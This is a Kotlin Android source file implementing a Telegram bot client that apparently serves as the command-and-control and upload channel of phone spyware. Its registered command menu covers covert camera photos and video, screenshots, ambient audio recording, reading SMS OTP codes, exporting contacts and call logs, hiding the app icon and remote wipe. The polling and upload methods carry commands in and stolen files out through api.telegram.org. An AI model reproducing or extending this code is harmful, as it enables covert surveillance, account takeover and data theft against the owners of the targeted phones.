package com.example.network

import android.content.Context
import android.net.Uri
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.ConnectionPool
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import okio.Buffer
import okio.BufferedSink
import okio.ForwardingSink
import okio.buffer
import org.json.JSONObject
import java.io.File
import java.io.InputStream
import java.util.concurrent.TimeUnit

data class TelegramCommandUpdate(
    val updateId: Long,
    val text: String,
    val senderName: String,
    val chatId: String,
    val date: Long,
    val senderUserId: String = ""
)

class TelegramApiService(private val context: Context) {

    private val connectionPool = ConnectionPool(8, 30, TimeUnit.SECONDS)

    // Dedicated high-speed polling client with fast connection failover
    private val pollingClient: OkHttpClient = OkHttpClient.Builder()
        .connectionPool(connectionPool)
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(8, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    // General purpose client for messages and larger uploads
    private val client: OkHttpClient = OkHttpClient.Builder()
        .connectionPool(connectionPool)
        .connectTimeout(25, TimeUnit.SECONDS)
        .writeTimeout(180, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    fun evictConnections() {
        try {
            connectionPool.evictAll()
            pollingClient.dispatcher.cancelAll()
            client.dispatcher.cancelAll()
        } catch (_: Exception) {}
    }

    suspend fun testConnection(botToken: String, chatId: String): Result<String> = withContext(Dispatchers.IO) {
        try {
            val url = "https://api.telegram.org/bot${botToken.trim()}/getMe"
            val request = Request.Builder()
                .url(url)
                .get()
                .build()

            pollingClient.newCall(request).execute().use { response ->
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    val json = JSONObject(responseBody)
                    val result = json.optJSONObject("result")
                    val botName = result?.optString("first_name", "Bot") ?: "Bot"
                    val username = result?.optString("username", "") ?: ""
                    Result.success("Connected to @$username ($botName)")
                } else {
                    val json = runCatching { JSONObject(responseBody) }.getOrNull()
                    val description = json?.optString("description") ?: "HTTP ${response.code}"
                    Result.failure(Exception("Telegram Error: $description"))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendMessage(
        botToken: String,
        chatId: String,
        text: String,
        replyMarkupJson: String? = null
    ): Result<String> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val trimmedChatId = chatId.trim()
            val url = "https://api.telegram.org/bot$trimmedToken/sendMessage"

            // Chunk if text exceeds 3900 characters to prevent Telegram HTTP 400 "message is too long" (limit 4096)
            val safeText = if (text.length > 3900) {
                text.take(3850) + "\n\n<i>...(truncated to fit Telegram message limit)...</i>"
            } else {
                text
            }

            fun sendAttempt(msgText: String, parseHtml: Boolean, markup: String?): Triple<Boolean, Int, String> {
                val bodyBuilder = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", trimmedChatId)
                    .addFormDataPart("text", msgText)
                if (parseHtml) {
                    bodyBuilder.addFormDataPart("parse_mode", "HTML")
                }
                if (!markup.isNullOrBlank()) {
                    bodyBuilder.addFormDataPart("reply_markup", markup)
                }
                val request = Request.Builder()
                    .url(url)
                    .post(bodyBuilder.build())
                    .build()
                return client.newCall(request).execute().use { resp ->
                    val respBody = resp.body?.string() ?: ""
                    Triple(resp.isSuccessful, resp.code, respBody)
                }
            }

            // Attempt 1: Standard HTML formatting with markup
            var (success1, code1, body1) = sendAttempt(safeText, true, replyMarkupJson)
            if (code1 == 429) {
                val retrySec = runCatching { JSONObject(body1).optJSONObject("parameters")?.optLong("retry_after", 1L) }.getOrNull() ?: 1L
                kotlinx.coroutines.delay((retrySec * 1000L).coerceIn(800L, 2500L))
                val retryRes = sendAttempt(safeText, true, replyMarkupJson)
                success1 = retryRes.first
                code1 = retryRes.second
                body1 = retryRes.third
            }
            if (success1) {
                return@withContext Result.success("Message sent successfully")
            }

            // Attempt 2: If HTML tags or entities failed, retry with plain text + markup
            val plainText = safeText.replace("<[^>]*>".toRegex(), "")
            var (success2, code2, body2) = sendAttempt(plainText, false, replyMarkupJson)
            if (code2 == 429) {
                kotlinx.coroutines.delay(1000L)
                val retryRes = sendAttempt(plainText, false, replyMarkupJson)
                success2 = retryRes.first
                code2 = retryRes.second
                body2 = retryRes.third
            }
            if (success2) {
                return@withContext Result.success("Message sent successfully (plain text fallback)")
            }

            // Attempt 3: If markup had invalid button data or format error, retry without markup
            if (!replyMarkupJson.isNullOrBlank()) {
                val (success3, _, _) = sendAttempt(safeText, true, null)
                if (success3) {
                    return@withContext Result.success("Message sent successfully (without markup fallback)")
                }
                val (success4, _, _) = sendAttempt(plainText, false, null)
                if (success4) {
                    return@withContext Result.success("Message sent successfully (plain text without markup)")
                }
            }

            val json = runCatching { JSONObject(body1.ifBlank { body2 }) }.getOrNull()
            val description = json?.optString("description") ?: "HTTP Send Failed (Code $code1)"
            Result.failure(Exception(description))
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun deleteWebhook(botToken: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val url = "https://api.telegram.org/bot$trimmedToken/deleteWebhook?drop_pending_updates=false"
            val request = Request.Builder()
                .url(url)
                .get()
                .build()
            client.newCall(request).execute().use { response ->
                Result.success(response.isSuccessful)
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendLocation(
        botToken: String,
        chatId: String,
        latitude: Double,
        longitude: Double
    ): Result<String> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val trimmedChatId = chatId.trim()
            val url = "https://api.telegram.org/bot$trimmedToken/sendLocation"

            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", trimmedChatId)
                .addFormDataPart("latitude", latitude.toString())
                .addFormDataPart("longitude", longitude.toString())
                .build()

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    Result.success("Location sent successfully")
                } else {
                    val json = runCatching { JSONObject(responseBody) }.getOrNull()
                    val description = json?.optString("description") ?: "HTTP ${response.code}"
                    Result.failure(Exception(description))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun setMyCommands(botToken: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val url = "https://api.telegram.org/bot$trimmedToken/setMyCommands"
            
            val commandsArray = org.json.JSONArray().apply {
                fun add(cmd: String, desc: String) {
                    put(JSONObject().apply {
                        put("command", cmd)
                        put("description", desc)
                    })
                }
                add("help", "📋 Remote dashboard & button controls")
                add("devices", "📱 List all active & online phones")
                add("select", "🎯 Select active target device (/select ID)")
                add("status", "📊 Hardware health, battery & system")
                add("location", "📍 Live GPS pin & Google Maps link")
                add("photo_front", "📸 Capture photo via front camera")
                add("photo_back", "📷 Capture photo via rear camera")
                add("video_front", "🎥 Record front camera video (10s)")
                add("video_back", "📹 Record back camera video (10s)")
                add("screenshot", "📱 Live screen capture of phone")
                add("record", "🎙️ Record ambient room audio (10s)")
                add("say", "🗣️ Speak text out loud via speaker")
                add("alert", "🚨 Emergency screen alert & siren")
                add("sim", "📱 SIM cards, carriers & numbers")
                add("accounts", "👤 Google, WhatsApp & device accounts")
                add("calls", "📞 Export all call logs (.txt file)")
                add("contacts", "👥 Export all contacts (.txt file)")
                add("otp", "🔐 Latest SMS & OTP verification codes")
                add("sendsms", "📨 Send SMS message from phone")
                add("clipboard", "📋 View device clipboard text")
                add("wifi", "📶 Wi-Fi status & remote toggle")
                add("apps", "📦 View installed applications")
                add("openapp", "🚀 Launch installed app remotely")
                add("fetch", "📁 Fetch files/photos from folder")
                add("list", "📂 List folder contents & files")
                add("delete", "🗑️ Delete files or folder path")
                add("setpin", "🔒 Set security PIN for app lock")
                add("hide", "👻 Auto-hide app icon on phone")
                add("unhide", "👁️ Restore app icon to launcher")
                add("wipe", "💥 Wipe phone data remotely")
                add("battery", "🔋 Battery percentage & health")
                add("storage", "💾 Internal storage & RAM details")
                add("network", "🌐 Wi-Fi & IP network details")
                add("media_stats", "📊 Photos, videos & audio counts")
            }

            val requestJson = JSONObject().apply {
                put("commands", commandsArray)
            }.toString()

            val requestBody = requestJson.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                Result.success(response.isSuccessful)
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun setChatMenuButton(botToken: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val url = "https://api.telegram.org/bot$trimmedToken/setChatMenuButton"
            val requestJson = JSONObject().apply {
                put("menu_button", JSONObject().apply {
                    put("type", "commands")
                })
            }.toString()
            val requestBody = requestJson.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            client.newCall(request).execute().use { response ->
                Result.success(response.isSuccessful)
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun registerBotCommandsAndMenu(botToken: String): Result<Boolean> = withContext(Dispatchers.IO) {
        val cmdRes = setMyCommands(botToken)
        setChatMenuButton(botToken)
        cmdRes
    }

    suspend fun answerCallbackQuery(botToken: String, callbackQueryId: String, text: String? = null): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val url = "https://api.telegram.org/bot$trimmedToken/answerCallbackQuery"
            val bodyBuilder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("callback_query_id", callbackQueryId)
            if (!text.isNullOrBlank()) {
                bodyBuilder.addFormDataPart("text", text)
            }
            val request = Request.Builder()
                .url(url)
                .post(bodyBuilder.build())
                .build()
            client.newCall(request).execute().use { response ->
                Result.success(response.isSuccessful)
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getUpdates(botToken: String, offset: Long = 0L, timeout: Int = 10): Result<List<TelegramCommandUpdate>> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val offsetParam = if (offset != 0L) "offset=$offset&" else ""
            val url = "https://api.telegram.org/bot$trimmedToken/getUpdates?${offsetParam}limit=50&timeout=$timeout&allowed_updates=%5B%22message%22%2C%22callback_query%22%2C%22channel_post%22%2C%22edited_message%22%5D"
            val request = Request.Builder()
                .url(url)
                .get()
                .build()

            pollingClient.newCall(request).execute().use { response ->
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    val json = JSONObject(responseBody)
                    val resultsArray = json.optJSONArray("result") ?: org.json.JSONArray()
                    val updates = mutableListOf<TelegramCommandUpdate>()
                    for (i in 0 until resultsArray.length()) {
                        val item = resultsArray.optJSONObject(i) ?: continue
                        val updateId = item.optLong("update_id", 0L)
                        val messageObj = item.optJSONObject("message")
                            ?: item.optJSONObject("channel_post")
                            ?: item.optJSONObject("edited_message")
                        val callbackQueryObj = item.optJSONObject("callback_query")

                        if (callbackQueryObj != null) {
                            val data = callbackQueryObj.optString("data", "").trim()
                            val queryId = callbackQueryObj.optString("id", "")
                            val fromObj = callbackQueryObj.optJSONObject("from")
                            val senderName = fromObj?.optString("first_name", "User") ?: "User"
                            val senderUserId = fromObj?.opt("id")?.toString()?.trim() ?: ""
                            val cbMsg = callbackQueryObj.optJSONObject("message")
                            val chatObj = cbMsg?.optJSONObject("chat")
                            val rawChatId = chatObj?.opt("id") ?: fromObj?.opt("id")
                            val chatId = rawChatId?.toString()?.trim() ?: ""
                            val date = cbMsg?.optLong("date", 0L) ?: System.currentTimeMillis() / 1000

                            if (queryId.isNotBlank()) {
                                answerCallbackQuery(trimmedToken, queryId, "Executing...")
                            }

                            if (data.isNotBlank()) {
                                updates.add(TelegramCommandUpdate(updateId, data, senderName, chatId, date, senderUserId))
                            }
                        } else if (messageObj != null) {
                            val text = messageObj.optString("text", "").trim()
                            val date = messageObj.optLong("date", 0L)
                            val fromObj = messageObj.optJSONObject("from")
                            val senderName = fromObj?.optString("first_name", "User") ?: "User"
                            val senderUserId = fromObj?.opt("id")?.toString()?.trim() ?: ""
                            val chatObj = messageObj.optJSONObject("chat")
                            val rawChatId = chatObj?.opt("id") ?: fromObj?.opt("id")
                            val chatId = rawChatId?.toString()?.trim() ?: ""
                            if (text.isNotBlank()) {
                                updates.add(TelegramCommandUpdate(updateId, text, senderName, chatId, date, senderUserId))
                            }
                        }
                    }
                    Result.success(updates)
                } else {
                    Result.failure(Exception("HTTP ${response.code}: $responseBody"))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun uploadMedia(
        botToken: String,
        chatId: String,
        uri: Uri,
        fileName: String,
        mimeType: String,
        isVideo: Boolean,
        caption: String? = null,
        onProgress: (bytesUploaded: Long, totalBytes: Long) -> Unit = { _, _ -> }
    ): Result<String> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val trimmedChatId = chatId.trim()
            val endpoint = if (isVideo) "sendVideo" else "sendPhoto"
            val filePartName = if (isVideo) "video" else "photo"
            val url = "https://api.telegram.org/bot$trimmedToken/$endpoint"

            val inputStream: InputStream = context.contentResolver.openInputStream(uri)
                ?: return@withContext Result.failure(Exception("Cannot open input stream for $fileName"))

            val totalBytes = context.contentResolver.openFileDescriptor(uri, "r")?.use {
                it.statSize
            } ?: -1L

            val mediaType = mimeType.toMediaTypeOrNull()

            val streamRequestBody = object : RequestBody() {
                override fun contentType() = mediaType

                override fun contentLength(): Long = totalBytes

                override fun writeTo(sink: BufferedSink) {
                    val countingSink = CountingSink(sink, totalBytes, onProgress)
                    val bufferedSink = countingSink.buffer()
                    inputStream.use { stream ->
                        val buffer = ByteArray(8192)
                        var read: Int
                        while (stream.read(buffer).also { read = it } != -1) {
                            bufferedSink.write(buffer, 0, read)
                        }
                        bufferedSink.flush()
                    }
                }
            }

            val multipartBuilder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", trimmedChatId)
                .addFormDataPart(filePartName, fileName, streamRequestBody)

            if (!caption.isNullOrBlank()) {
                multipartBuilder.addFormDataPart("caption", caption)
            }
            if (isVideo) {
                multipartBuilder.addFormDataPart("supports_streaming", "true")
            }

            val request = Request.Builder()
                .url(url)
                .post(multipartBuilder.build())
                .build()

            client.newCall(request).execute().use { response ->
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    Result.success("Success: $fileName uploaded")
                } else {
                    val json = runCatching { JSONObject(responseBody) }.getOrNull()
                    val description = json?.optString("description") ?: "HTTP ${response.code}"
                    Result.failure(Exception(description))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun uploadAudio(
        botToken: String,
        chatId: String,
        uri: Uri,
        fileName: String,
        mimeType: String,
        caption: String? = null,
        onProgress: (bytesUploaded: Long, totalBytes: Long) -> Unit = { _, _ -> }
    ): Result<String> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val trimmedChatId = chatId.trim()
            val url = "https://api.telegram.org/bot$trimmedToken/sendAudio"

            val inputStream: InputStream = context.contentResolver.openInputStream(uri)
                ?: return@withContext Result.failure(Exception("Cannot open audio input stream for $fileName"))

            val totalBytes = context.contentResolver.openFileDescriptor(uri, "r")?.use {
                it.statSize
            } ?: -1L

            val mediaType = mimeType.toMediaTypeOrNull()

            val streamRequestBody = object : RequestBody() {
                override fun contentType() = mediaType
                override fun contentLength(): Long = totalBytes

                override fun writeTo(sink: BufferedSink) {
                    val countingSink = CountingSink(sink, totalBytes, onProgress)
                    val bufferedSink = countingSink.buffer()
                    inputStream.use { stream ->
                        val buffer = ByteArray(8192)
                        var read: Int
                        while (stream.read(buffer).also { read = it } != -1) {
                            bufferedSink.write(buffer, 0, read)
                        }
                        bufferedSink.flush()
                    }
                }
            }

            val multipartBuilder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", trimmedChatId)
                .addFormDataPart("audio", fileName, streamRequestBody)

            if (!caption.isNullOrBlank()) {
                multipartBuilder.addFormDataPart("caption", caption)
            }

            val request = Request.Builder()
                .url(url)
                .post(multipartBuilder.build())
                .build()

            client.newCall(request).execute().use { response ->
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    Result.success("Success: $fileName audio uploaded")
                } else {
                    val json = runCatching { JSONObject(responseBody) }.getOrNull()
                    val description = json?.optString("description") ?: "HTTP ${response.code}"
                    Result.failure(Exception(description))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun uploadDocument(
        botToken: String,
        chatId: String,
        uri: Uri,
        fileName: String,
        mimeType: String,
        caption: String? = null,
        onProgress: (bytesUploaded: Long, totalBytes: Long) -> Unit = { _, _ -> }
    ): Result<String> = withContext(Dispatchers.IO) {
        try {
            val trimmedToken = botToken.trim()
            val trimmedChatId = chatId.trim()
            val url = "https://api.telegram.org/bot$trimmedToken/sendDocument"

            val inputStream: InputStream = context.contentResolver.openInputStream(uri)
                ?: return@withContext Result.failure(Exception("Cannot open document stream for $fileName"))

            val totalBytes = context.contentResolver.openFileDescriptor(uri, "r")?.use {
                it.statSize
            } ?: -1L

            val mediaType = mimeType.toMediaTypeOrNull()

            val streamRequestBody = object : RequestBody() {
                override fun contentType() = mediaType
                override fun contentLength(): Long = totalBytes

                override fun writeTo(sink: BufferedSink) {
                    val countingSink = CountingSink(sink, totalBytes, onProgress)
                    val bufferedSink = countingSink.buffer()
                    inputStream.use { stream ->
                        val buffer = ByteArray(8192)
                        var read: Int
                        while (stream.read(buffer).also { read = it } != -1) {
                            bufferedSink.write(buffer, 0, read)
                        }
                        bufferedSink.flush()
                    }
                }
            }

            val multipartBuilder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", trimmedChatId)
                .addFormDataPart("document", fileName, streamRequestBody)

            if (!caption.isNullOrBlank()) {
                multipartBuilder.addFormDataPart("caption", caption)
            }

            val request = Request.Builder()
                .url(url)
                .post(multipartBuilder.build())
                .build()

            client.newCall(request).execute().use { response ->
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    Result.success("Success: $fileName document uploaded")
                } else {
                    val json = runCatching { JSONObject(responseBody) }.getOrNull()
                    val description = json?.optString("description") ?: "HTTP ${response.code}"
                    Result.failure(Exception(description))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun uploadFileDirect(
        botToken: String,
        chatId: String,
        file: File,
        caption: String? = null,
        onProgress: (bytesUploaded: Long, totalBytes: Long) -> Unit = { _, _ -> }
    ): Result<String> = withContext(Dispatchers.IO) {
        try {
            if (!file.exists() || !file.isFile) {
                return@withContext Result.failure(Exception("File does not exist: ${file.absolutePath}"))
            }

            val totalBytes = file.length()
            if (totalBytes > 50 * 1024 * 1024) {
                val sizeMb = String.format(java.util.Locale.US, "%.1f", totalBytes / (1024.0 * 1024.0))
                return@withContext Result.failure(Exception("File size (${sizeMb} MB) exceeds Telegram 50MB bot upload limit"))
            }

            val fileName = file.name
            val ext = file.extension.lowercase()
            val isImage = ext in listOf("jpg", "jpeg", "png", "webp", "gif", "bmp")
            val isVideo = ext in listOf("mp4", "mkv", "3gp", "webm", "avi", "mov")
            val isAudio = ext in listOf("mp3", "m4a", "wav", "aac", "flac", "ogg")

            val endpoint = when {
                isImage && totalBytes <= 10 * 1024 * 1024 -> "sendPhoto"
                isVideo -> "sendVideo"
                isAudio -> "sendAudio"
                else -> "sendDocument"
            }
            val filePartName = when (endpoint) {
                "sendPhoto" -> "photo"
                "sendVideo" -> "video"
                "sendAudio" -> "audio"
                else -> "document"
            }

            val mimeType = when {
                ext in listOf("jpg", "jpeg") -> "image/jpeg"
                ext == "png" -> "image/png"
                ext == "webp" -> "image/webp"
                ext == "gif" -> "image/gif"
                ext == "bmp" -> "image/bmp"
                ext == "mp4" -> "video/mp4"
                ext == "mkv" -> "video/x-matroska"
                ext == "3gp" -> "video/3gpp"
                ext == "webm" -> "video/webm"
                ext == "mp3" -> "audio/mpeg"
                ext == "m4a" -> "audio/mp4"
                ext == "wav" -> "audio/wav"
                ext == "aac" -> "audio/aac"
                ext == "ogg" -> "audio/ogg"
                ext == "pdf" -> "application/pdf"
                ext == "apk" -> "application/vnd.android.package-archive"
                ext == "zip" -> "application/zip"
                ext == "txt" -> "text/plain"
                else -> "application/octet-stream"
            }

            val trimmedToken = botToken.trim()
            val trimmedChatId = chatId.trim()
            val url = "https://api.telegram.org/bot$trimmedToken/$endpoint"

            val mediaType = mimeType.toMediaTypeOrNull()

            val streamRequestBody = object : RequestBody() {
                override fun contentType() = mediaType
                override fun contentLength(): Long = totalBytes

                override fun writeTo(sink: BufferedSink) {
                    val countingSink = CountingSink(sink, totalBytes, onProgress)
                    val bufferedSink = countingSink.buffer()
                    file.inputStream().use { stream ->
                        val buffer = ByteArray(8192)
                        var read: Int
                        while (stream.read(buffer).also { read = it } != -1) {
                            bufferedSink.write(buffer, 0, read)
                        }
                        bufferedSink.flush()
                    }
                }
            }

            val multipartBuilder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", trimmedChatId)
                .addFormDataPart(filePartName, fileName, streamRequestBody)

            if (!caption.isNullOrBlank()) {
                val safeCaption = if (caption.length > 1024) caption.take(1000) + "..." else caption
                multipartBuilder.addFormDataPart("caption", safeCaption)
                if (safeCaption.contains("<") && safeCaption.contains(">")) {
                    multipartBuilder.addFormDataPart("parse_mode", "HTML")
                }
            }
            if (isVideo) {
                multipartBuilder.addFormDataPart("supports_streaming", "true")
            }

            val request = Request.Builder()
                .url(url)
                .post(multipartBuilder.build())
                .build()

            client.newCall(request).execute().use { response ->
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    Result.success("Success: $fileName uploaded")
                } else {
                    val json = runCatching { JSONObject(responseBody) }.getOrNull()
                    val description = json?.optString("description") ?: "HTTP ${response.code}"
                    Result.failure(Exception(description))
                }
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    private class CountingSink(
        delegate: okio.Sink,
        private val totalBytes: Long,
        private val onProgress: (Long, Long) -> Unit
    ) : ForwardingSink(delegate) {
        private var bytesWritten = 0L

        override fun write(source: Buffer, byteCount: Long) {
            super.write(source, byteCount)
            bytesWritten += byteCount
            onProgress(bytesWritten, if (totalBytes > 0) totalBytes else bytesWritten)
        }
    }
}
